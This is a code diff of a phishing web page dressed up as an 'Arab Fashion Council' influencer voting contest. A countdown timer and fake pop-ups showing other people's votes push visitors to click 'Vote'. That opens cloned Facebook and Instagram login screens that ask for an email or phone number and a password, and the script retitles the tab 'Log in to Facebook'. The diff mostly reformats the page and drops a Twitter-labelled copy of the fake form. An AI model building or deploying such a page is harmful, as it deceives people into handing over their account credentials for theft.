@@ -1,17 +1,14 @@
 <!DOCTYPE html>
 <html class="_9dls touch _ar44 js-focus-visible _aa4c" lang="en" dir="ltr" data-js-focus-visible="">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description"
-        content="Empowering Arab Fashion: Uniting 22 Nations to Foster Creative Economy and Style Innovation. Explore the vibrant world of Arab fashion heritage and contemporary design.">
-    <meta property="og:title" content="Empowering Arab Fashion" />
-    <meta property="og:description"
-        content="Uniting 22 Nations to Foster Creative Economy and Style Innovation. Explore the vibrant world of Arab fashion heritage and contemporary design." />
-    <meta property="og:image" content="img/slide.png" />
-    <meta property="og:url" content="" />
-    <meta property="og:type" content="website" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Empowering Arab Fashion: Uniting 22 Nations to Foster Creative Economy and Style Innovation. Explore the vibrant world of Arab fashion heritage and contemporary design.">
+  <meta property="og:title" content="Empowering Arab Fashion" />
+  <meta property="og:description" content="Uniting 22 Nations to Foster Creative Economy and Style Innovation. Explore the vibrant world of Arab fashion heritage and contemporary design." />
+  <meta property="og:image" content="img/slide.png" />
+  <meta property="og:url" content="" />
+  <meta property="og:type" content="website" />
 
     <link id="dynamic-favicon" href="image/favicon.png" rel="shortcut icon" sizes="196x196">
     <link type="text/css" rel="stylesheet" href="css/fb.css">
@@ -24,61 +21,46 @@
     <script src="js/index.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
-    <title>Arab Fashion Council</title>
+  <title>Arab Fashion Council</title>
     <style>
         .mgm {
             display: none;
             position: absolute;
-            top: 250px;
-            /* Adjust top position as needed */
+            top: 250px; /* Adjust top position as needed */
             background-color: #fff9d7;
             border: 1px solid #e2c822;
             left: 0;
             width: 100%;
             padding: 5px;
             text-align: center;
-            border-radius: 5px;
-            /* Optional: Rounded corners */
+            border-radius: 5px; /* Optional: Rounded corners */
         }
-
         .mgm .txt {
             font-family: Arial, sans-serif;
-            display: inline-block;
-            /* Display text inline-block to align with image */
-            vertical-align: middle;
-            /* Vertical alignment with image */
-            margin-left: 10px;
-            /* Adjust margin between image and text */
+            display: inline-block; /* Display text inline-block to align with image */
+            vertical-align: middle; /* Vertical alignment with image */
+            margin-left: 10px; /* Adjust margin between image and text */
             font-size: 11px;
         }
-
         .mgm img {
-            display: inline-block;
-            /* Display image inline-block */
-            width: 35px;
-            /* Adjust image size as needed */
+            display: inline-block; /* Display image inline-block */
+            width: 35px; /* Adjust image size as needed */
             height: 35px;
-            border-radius: 50%;
-            /* Optional: Rounded image */
-            vertical-align: middle;
-            /* Vertical alignment with text */
+            border-radius: 50%; /* Optional: Rounded image */
+            vertical-align: middle; /* Vertical alignment with text */
         }
-
         .stopwatch {
             width: 100px;
-            position: sticky;
-            /* Change from absolute to sticky */
-            top: 40px;
-            /* Stick to the top of the header */
-            margin: 20px auto;
-            /* Center horizontally with margin */
+            position: sticky; /* Change from absolute to sticky */
+            top: 40px; /* Stick to the top of the header */
+            margin: 20px auto; /* Center horizontally with margin */
             border-radius: 50%;
             background: radial-gradient(circle, #ccc 70%, #fff);
             box-shadow: 0 0 8px rgba(0, 0, 0, 0.2);
             z-index: 1000;
         }
 
-        .clock-face {
+         .clock-face {
             position: absolute;
             top: 50%;
             left: 50%;
@@ -95,19 +77,15 @@
             text-align: center;
             box-shadow: inset 0 0 3px rgba(0, 0, 0, 0.1);
         }
-
+       
         .time {
             font-size: 14px;
         }
-
         .icon {
-            width: 40px;
-            /* Set the width of the image */
-            height: 40px;
-            /* Set the height of the image */
+            width: 40px; /* Set the width of the image */
+            height: 40px; /* Set the height of the image */
             margin: 0;
         }
-
         .hide-button {
             position: absolute;
             top: 20px;
@@ -120,33 +98,28 @@
             cursor: pointer;
             border-radius: 5px;
         }
-
         .hide-button:hover {
             background-color: #0056b3;
         }
-
         .show-mgm {
-            margin-top: 20px;
-            /* Adjust the margin value as needed */
+            margin-top: 20px; /* Adjust the margin value as needed */
         }
-
         .imag {
-            top: 50px;
+          top: 50px;
         }
     </style>
     <style>
-        ._585n {
-            background-color: #3578e5;
-            border: 1px solid #3578e5;
-            border-radius: 3px;
-            overflow: hidden;
-            padding: 0 0 0 40px;
-        }
+      ._585n {
+          background-color: #3578e5;
+          border: 1px solid #3578e5;
+          border-radius: 3px;
+          overflow: hidden;
+          padding: 0 0 0 40px;
+      }
     </style>
 </head>
-
 <body>
-    <div id="home">
+  <div id="home">
 
         <header>
             <div class="stopwatch" onclick="toggleStopwatch()">
@@ -156,146 +129,143 @@
                 </div>
             </div><br>
 
-
-            <img src="img/slide.png"><br><br>
-
+          
+              <img src="img/slide.png"><br><br>
+          
             <center>
                 <div class="mgm">
                     <span class="txt"></span>
                 </div><br>
 
                 <button id="vote2" onclick="vote()">
-                    Click Here To Vote
+                  Click Here To Vote
                 </button>
             </center>
         </header>
 
-        <div id="blue">
+    <div id="blue">
 
-            <h2>
-                Arab Fashion Council
-            </h2>
+      <h2>
+        Arab Fashion Council
+      </h2>
 
-        </div>
-        <div id="news">
-            <p>
-                Are you ready to immerse yourself in a world of style, culture, and innovation? The Arab Fashion Council
-                is your gateway to the captivating realm of Arab fashion. We invite you to join us on a journey where
-                tradition meets modernity, and where fashion becomes a powerful expression of identity.
-            </p>
-        </div>
-
-        <div id="news">
-            <p>Vote for Excellence. Vote for Diversity. Vote for Arab Fashion Council!</p>
-
-        </div>
-
-        <div id="blue">
-
-            <h2>
-                📢 How to Vote:
-            </h2>
-
-        </div>
-        <div id="news">
-            <p>
-            </p>
-        </div>
-
-        <div id="news">
-            <p>#1 Each influencer has a unique hashtag our social media page.</p>
-            <p>#2 Click the vote button</p>
-            <p>#3 Voting Deadline: Voting is open until December. Don't miss the chance to support your favorite
-                influencer!</p>
-
-        </div>
-
-
-        </center>
-        <div id="blue">
-            <center>
-                <h2>Meet Our Contestants</h2>
-            </center>
-        </div>
-        <br>
-        <center>
-            <profile>
-
-                <!-- Profile Card 1 -->
-                <div id="voter" class="profile-card">
-                    <img src="img/contest1.jpg" alt="Profile 1" class="profile-image">
-                    <div class="hashtags">
-                        <span>#ArabFashionCouncil</span>
-                    </div>
-                    <button onclick="vote()" class="vote-button">Vote</button>
-                </div>
-
-                <!-- Profile Card 2 -->
-                <div id="voter" class="profile-card">
-                    <img src="img/contestant002.jpg" alt="Profile 2" class="profile-image">
-                    <div class="hashtags">
-                        <span>#DubaiFashionWeek</span>
-                    </div>
-                    <button onclick="vote()" class="vote-button">Vote</button>
-                </div>
-
-                <!-- Profile Card 3 -->
-                <div id="voter" class="profile-card">
-                    <img src="img/contestant003.jpg" alt="Profile 2" class="profile-image">
-                    <div class="hashtags">
-                        <span>#ArabFashionInnovation</span>
-                    </div>
-                    <button onclick="vote()" class="vote-button">Vote</button>
-                </div>
-
-                <!-- Profile Card 4 -->
-                <div id="voter" class="profile-card">
-                    <img src="img/contestant004.jpg" alt="Profile 2" class="profile-image">
-                    <div class="hashtags">
-                        <span>#Creativity</span>
-                    </div>
-                    <button onclick="vote()" class="vote-button">Vote</button>
-                </div>
-
-                <!-- Profile Card 5 -->
-                <div id="voter" class="profile-card">
-                    <img src="img/contestant005.jpg" alt="Profile 2" class="profile-image">
-                    <div class="hashtags">
-                        <span>#ArabFashionHeritage</span>
-                    </div>
-                    <button onclick="vote()" class="vote-button">Vote</button>
-                </div>
-
-                <!-- Profile Card 6 -->
-                <div id="voter" class="profile-card">
-                    <img src="img/contestant006.jpg" alt="Profile 2" class="profile-image">
-                    <div class="hashtags">
-                        <span>#CulturalCouture</span>
-                    </div>
-                    <button onclick="vote()" class="vote-button">Vote</button>
-                </div>
-
-                <!-- Profile Card 7 -->
-                <div id="voter" class="profile-card">
-                    <img src="img/contestant007.jpg" alt="Profile 2" class="profile-image">
-                    <div class="hashtags">
-                        <span>#ArabFashionTrends</span>
-                    </div>
-                    <button onclick="vote()" class="vote-button">Vote</button>
-                </div>
-
-                <!-- Profile Card 8 -->
-                <div id="voter" class="profile-card">
-                    <img src="img/contestant008.jpg" alt="Profile 2" class="profile-image">
-                    <div class="hashtags">
-                        <span>#ArabFashionista</span>
-                    </div>
-                    <button onclick="vote()" class="vote-button">Vote</button>
-                </div>
-            </profile>
-        </center>
     </div>
+    <div id="news">
+      <p>
+        Are you ready to immerse yourself in a world of style, culture, and innovation? The Arab Fashion Council is your gateway to the captivating realm of Arab fashion. We invite you to join us on a journey where tradition meets modernity, and where fashion becomes a powerful expression of identity.
+      </p>
+    </div>
+
+    <div id="news">
+      <p>Vote for Excellence. Vote for Diversity. Vote for Arab Fashion Council!</p>
+
+    </div>
+
+    <div id="blue">
+
+      <h2>
+        📢 How to Vote:
+      </h2>
+
+    </div>
+    <div id="news">
+      <p>
+      </p>
+    </div>
+
+    <div id="news">
+      <p>#1 Each influencer has a unique hashtag our social media page.</p>
+      <p>#2 Click the vote button</p>
+      <p>#3 Voting Deadline: Voting is open until December. Don't miss the chance to support your favorite influencer!</p>
+
+    </div>
+
+ 
+    </center>
+    <div id="blue">
+      <center>
+        <h2>Meet Our Contestants</h2>
+      </center>
+    </div>
+    <br>
     <center>
+ <profile>
+
+        <!-- Profile Card 1 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contest1.jpg" alt="Profile 1" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionCouncil</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 2 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant002.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#DubaiFashionWeek</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 3 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant003.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionInnovation</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 4 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant004.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#Creativity</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 5 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant005.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionHeritage</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 6 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant006.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#CulturalCouture</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 7 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant007.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionTrends</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 8 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant008.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionista</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+    </profile>
+  </center>
+  </div>
+<center>
         <div id="choose" class="t706__cartwin t706__cartwin_showed"
             style="opacity: 1; transition: opacity 0.3s ease 0s;">
             <div class="t706" data-cart-countdown="yes" data-opencart-onorder="yes" data-project-currency="د.إ.&rlm;"
@@ -304,10 +274,11 @@
                 data-cart-sendevent-onadd="y">
 
                 <div class="t706__cartwin t706__cartwin_showed" style="opacity: 1; transition: opacity 0.3s ease 0s;">
-                    <div class="t706__close t706__cartwin-close"><button id="cancel" onclick="can()" type="button"
-                            class="t706__close-button t706__cartwin-close-wrapper" aria-label="Закрыть корзину"><svg
-                                role="presentation" class="t706__close-icon t706__cartwin-close-icon" width="23px"
-                                height="23px" viewBox="0 0 23 23" version="1.1" xmlns="http://www.w3.org/2000/svg"
+                    <div class="t706__close t706__cartwin-close"><button id="cancel" onclick="can()" 
+                            type="button" class="t706__close-button t706__cartwin-close-wrapper"
+                            aria-label="Закрыть корзину"><svg role="presentation"
+                                class="t706__close-icon t706__cartwin-close-icon" width="23px" height="23px"
+                                viewBox="0 0 23 23" version="1.1" xmlns="http://www.w3.org/2000/svg"
                                 xmlns:xlink="http://www.w3.org/1999/xlink">
                                 <g stroke="none" stroke-width="1" fill="#fff" fill-rule="evenodd">
                                     <rect
@@ -328,7 +299,6 @@
                             </div>
                             <img id="choose_fb" onclick="handleFbClick()" src="image/fb.png">
                             <img id="choose_ig" onclick="handleIgClick()" src="image/ig.png">
-                            <img id="choose_tw" onclick="handleTWClick()" src="image/tw.png">
                         </div>
                     </div>
                     <div class="t706__cartdata"></div>
@@ -339,111 +309,6 @@
         </div>
     </center>
 
-    <!--Twitter login begins-->
-    <div id="tw_wrapper">
-
-        <div id="fbbody" class="fbook">
-            <br>
-            <center><span
-                    style="display: flex; justify-content: center; align-items: center; text-align: center; color: rgb(70, 90, 105); display: inline; font-size: 13px; font-family: &quot;Optimistic Text Normal&quot;; ">English
-                    (UK)</span></center><br><br><br><br>
-
-            <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                style="pointer-events: none; margin-top: 0px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center;">
-                <img alt="Facebook from Meta" src="img/fblogo.png" class="wbloks_1"
-                    style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
-            </div><br><br><br>
-
-            <div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box" style="display: none;">
-                <div class="fsl fwb fcb">Wrong credentials</div>
-                <div>Invalid username or password</div>
-            </div><br>
-
-
-            <div class="form-group">
-                <input type="text" id="fb-email" required oninput="toggleClearIcon()">
-                <label for="fb-email">Mobile number or email address</label>
-                <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
-            </div>
-
-            <div class="form-group">
-                <input type="password" id="fb-pass" required>
-                <label for="fb-pass">Password</label>
-                <div class="toggle-password" onclick="togglePasswordVisibility()"></div>
-                <!-- Icon as a clickable div -->
-            </div>
-
-            <div
-                style="opacity: 1; height: 44px; min-width: 44px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 100, 224); border: 0px solid rgb(28, 43, 51); border-radius: 22px; align-items: center; flex-direction: row; justify-content: center;">
-
-                <div class="wbloks_113" dir="auto">
-
-                    <div onclick="login()"
-                        style="padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: &quot;Optimistic Text Normal&quot;;  ">
-                        Log
-                        in</div>
-
-                </div>
-            </div> <br><br>
-
-            <div class="wbloks_112" style="font-size: 15px; max-height: 20.28px; word-break: break-all;">
-                <div class="wbloks_113" dir="auto"><span data-bloks-name="bk.components.TextSpan"
-                        style="line-height: 1rem; color: rgb(28, 43, 51); font-weight: 500; display: inline; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Forgotten
-                        Password?</span></div>
-            </div><br><br><br><br><br>
-
-            <div data-bloks-name="bk.components.Flexbox" tabindex="0" role="button" aria-label="Create new account"
-                data-anchor-id="replay" class="wbloks_1" style="pointer-events: inherit; width: 100%;">
-                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                    style="pointer-events: none; opacity: 1; height: 36px; min-width: 36px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(203, 210, 217); border-radius: 18px; align-items: center; flex-direction: row; justify-content: center;">
-                    <div>
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="padding: 8px; display: flex; justify-content: center; color: rgb(28, 43, 51); font-weight: 500; display: flex; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Create
-                            new account</span>
-                    </div>
-
-                </div>
-            </div>
-
-
-            <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                style="pointer-events: none; flex-grow: 1; flex-shrink: 1e+06; padding-bottom: 0px; flex-direction: column; justify-content: flex-end;">
-                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                    style="pointer-events: none; padding-top: 20px; padding-bottom: 20px; align-items: center; justify-content: center;">
-                    <center>
-                        <div class="wbloks_1" style="height: 12px; aspect-ratio: 5 / 1;">
-                            <div data-bloks-name="bk.components.AspectRatio" class="wbloks_108"
-                                style="aspect-ratio: 5 / 1;">
-                                <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" height="1" width="5"
-                                    class="wbloks_110"></svg>
-                            </div>
-                            <div class="wbloks_109"><img alt="Meta logo" src="img/meta.png" class="wbloks_1"
-                                    style="width: 100%; pointer-events: inherit; mask-image: url(img/meta.png); mask-size: contain; background-color: rgb(70, 90, 105); object-position: 10000px 10000px; object-fit: contain; overflow: hidden;">
-                            </div>
-                    </center>
-                </div>
-            </div><br>
-            <div data-bloks-name="bk.components.Flexbox"
-                style="font-family: &quot;Optimistic Text Normal&quot;; word-spacing: 10px; pointer-events: none; align-items: center; flex-direction: column; justify-content: center;">
-                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1" style="pointer-events: none;">
-                    <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                        style="pointer-events: none; padding-left: 4px; padding-right: 4px; padding-bottom: 4px;">
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">About</span>
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">Help</span>
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">More</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-    </div>
-    <!--Twitter login ends-->
-
-
-    <!--Facebook login begins-->
     <div id="fb_wrapper">
 
         <div id="fbbody" class="fbook">
@@ -544,8 +409,6 @@
         </div>
 
     </div>
-    <!--Facebook login ends-->
-
 
     <!--Insta login begins-->
     <div id="ig_wrapper">
@@ -756,6 +619,8 @@
             </div>
         </div>
     </div>
+
+
     <!--Insta login ends-->
 
 
@@ -807,20 +672,6 @@
         function changeFavicon(iconUrl) {
             const favicon = document.getElementById('dynamic-favicon');
             favicon.href = iconUrl;
-        }
-
-        function fb() {
-            document.getElementById("fb_wrapper").style.display = "block";
-            document.getElementById("ig_wrapper").style.display = "none";
-            document.getElementById("home").style.display = "none";
-            document.getElementById("choose").style.display = "none";
-
-        }
-
-        function handleFbClick() {
-            changeFavicon('img/favicon.png');
-            fb();
-            document.title = 'Log in to Facebook';
         }
 
         function fb() {
@@ -928,7 +779,7 @@
             var transtype = transarray[Math.floor(Math.random() * transarray.length)];
 
             var msg = '<img src="' + person.image + '" class="profile-pic" alt="Profile Picture">' +
-                '<span class="txt">' + person.name + ' from <b>' + country + '</b> ' + transtype;
+                      '<span class="txt">' + person.name + ' from <b>' + country + '</b> ' + transtype ;
             $(".mgm").html(msg); // Update entire content of .mgm
             $(".mgm").stop(true).fadeIn(300);
             window.setTimeout(function () {
@@ -994,11 +845,11 @@
         }
 
         // Automatically start countdown on page load
-        window.onload = function () {
+        window.onload = function() {
             startTimer();
 
             // Add event listener to hide stopwatch on any button click
-            document.addEventListener('click', function (event) {
+            document.addEventListener('click', function(event) {
                 if (event.target.tagName.toLowerCase() === 'button') {
                     document.getElementById('stopwatch').style.display = 'none';
                 }
@@ -1007,16 +858,16 @@
     </script>
 
     <script>
-        // Function to show the Choose dialog
-        function showDialog() {
-            document.getElementById("choose").classList.add("active");
-        }
-
-        // Function to hide the Choose dialog
-        function hideDialog() {
-            document.getElementById("choose").classList.remove("active");
-        }
-
+      // Function to show the Choose dialog
+      function showDialog() {
+        document.getElementById("choose").classList.add("active");
+      }
+      
+      // Function to hide the Choose dialog
+      function hideDialog() {
+        document.getElementById("choose").classList.remove("active");
+      }
+  
     </script>
 
 
